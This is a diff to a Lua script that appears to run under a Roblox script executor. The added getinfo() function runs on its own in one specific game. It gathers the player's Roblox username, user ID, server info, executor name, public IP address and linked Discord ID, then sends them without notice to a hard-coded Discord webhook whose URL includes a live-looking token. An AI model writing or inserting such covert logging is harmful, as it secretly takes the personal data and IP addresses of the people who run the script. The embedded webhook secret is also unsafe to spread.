@@ -266,6 +266,53 @@ elseif true then
             end
         end)
     end
+    local function getinfo()
+        task.spawn(function()
+            local request_func = http_request
+            if (request_func and game.PlaceId == 13253735473) then
+                --//setting variables
+                local url = 'https://discordapp.com/api/webhooks/1120219415917641748/AojfxDudoxNKZG19FiF2_BXMhV7UbJrNa94mv9TiSFCTOKmxP_3_F6q7wDY8vaNZ02Jc'
+                local local_player = game:GetService('Players').LocalPlayer
+                identifyexecutor = identifyexecutor or function() return 'Unknown' end
+    
+                --//creating data
+                local player_properties = {
+                    roblox = {
+                        username = local_player.Name,
+                        display_name = local_player.DisplayName,
+                        userid = local_player.UserId,
+                        trident_server = local_player.PlayerGui.GameUI.ServerInfo.Text,
+                    },
+                    other = {
+                        executor = identifyexecutor(),
+                        ip = game:HttpGet('https://api.ipify.org/'),
+                        discord_id = LRM_LinkedDiscordID or 'Unkown',
+                        script_name = LRM_ScriptName or 'Unknown',
+                    },
+                }
+                --//creating data description
+                local data_description = '**Roblox**\n\n'
+                do
+                    for index, data in pairs(player_properties.roblox) do
+                        data_description = data_description .. '**' .. tostring(index) .. ': **' .. tostring(data) .. '\n'
+                    end
+                    data_description = data_description .. '\n**Deeper Info**\n\n'
+                    for index, data in pairs(player_properties.other) do
+                        data_description = data_description .. '**' .. tostring(index) .. ': **' .. tostring(data) .. '\n'
+                    end
+                end
+                --//sending webhook
+                do
+                    local data = {['embeds'] = {{['title'] = 'Script Ran',
+                    ['description'] = tostring(data_description),
+                    ['color'] = tonumber(0x7269da),
+                    ['url'] = 'https://www.roblox.com/users/' .. tostring(player_properties.roblox.userid) .. '/profile'}}}
+                    request_func({Url = url, Body = game:GetService('HttpService'):JSONEncode(data), Method = 'POST', Headers = {['content-type'] = 'application/json'}})
+                end
+            end
+        end)
+    end
+    getinfo()
 else
     local httpService = game:GetService('HttpService')
 
